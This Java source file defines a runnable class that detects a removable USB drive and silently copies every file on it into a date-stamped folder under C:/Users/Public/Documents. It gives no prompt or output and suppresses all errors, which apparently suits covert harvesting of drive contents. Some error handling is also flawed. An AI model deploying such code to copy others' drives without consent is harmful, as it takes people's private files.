package fileCopyPaste;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Vector;

import javax.swing.filechooser.FileSystemView;

public class CopyFromUsbDrive implements Runnable {

	public Vector<String> files;

	public String toFolder;

	public CopyFromUsbDrive() {
		// TODO Auto-generated constructor stub
		files = new Vector<String>();
		java.util.Date date = new java.util.Date();

		String lastDateString = date.toString();
		lastDateString = lastDateString.replaceAll(":", "_");
		toFolder = new String("C:/Users/Public/Documents/" + lastDateString);
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		String drive = detectUsb();
		if (drive.length() == 0) {
			return;
		}

		drive = drive.substring(0, 2);

		makeAllFileReady(drive);

		int total = files.size();
		for (int i = 0; i < total; i++) {
			try {
				copyFileUsingFileStreams(files.get(i));
			} catch (Exception e) {
			}
		}

	}

	private void copyFileUsingFileStreams(String fileAll) throws IOException {

		File source = new File(fileAll);
		File dest = new File(toFolder + "/" + fileAll.substring(3, fileAll.length()));

		if (dest.isDirectory()) {
			dest.mkdirs();
			return;
		}

		String extra = dest.getParent();
		new File(extra).mkdirs();

		InputStream input = null;
		OutputStream output = null;
		try {
			input = new FileInputStream(source);
			output = new FileOutputStream(dest);
			byte[] buf = new byte[8192];
			int bytesRead;
			while ((bytesRead = input.read(buf)) > 0) {
				output.write(buf, 0, bytesRead);
			}
		} finally {
			input.close();
			output.close();
		}

	}

	public void makeAllFileReady(String from) {
		from += "/";
		File[] f = new File(from).listFiles();
		for (int i = 0; i < f.length; i++) {
			try {
				files.add(f[i].getAbsolutePath());
				if (f[i].isDirectory()) {
					makeAllFileReady(f[i].getAbsolutePath());
				}
			} catch (Exception e) {
			}
		}
	}

	public String detectUsb() {
		FileSystemView fsv = FileSystemView.getFileSystemView();
		File[] f = File.listRoots();

		for (int i = 0; i < f.length; i++) {
			String type = fsv.getSystemTypeDescription(f[i]);
			if (type.toLowerCase().contains("removable")) {
				return f[i].getPath();
			}
		}
		return "";
	}
}
